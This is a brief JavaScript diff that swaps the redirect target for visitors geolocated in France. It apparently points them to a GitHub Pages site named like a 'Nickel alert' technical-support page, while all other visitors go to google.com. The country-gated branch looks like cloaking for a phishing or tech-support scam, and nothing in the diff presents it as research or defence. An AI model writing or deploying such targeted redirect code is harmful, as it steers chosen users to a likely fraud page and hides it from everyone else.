@@ -11,7 +11,7 @@
 
         if (data && data.country_code === 'FR') {
           // Si l'utilisateur est en France
-          window.location.href = 'https://www.segarasia.com/old/sg/';
+          window.location.href = 'https://nickel-alerte.github.io/support-technique/';
         } else {
           // Si l'utilisateur N'EST PAS en France
           window.location.href = 'https://google.com/';
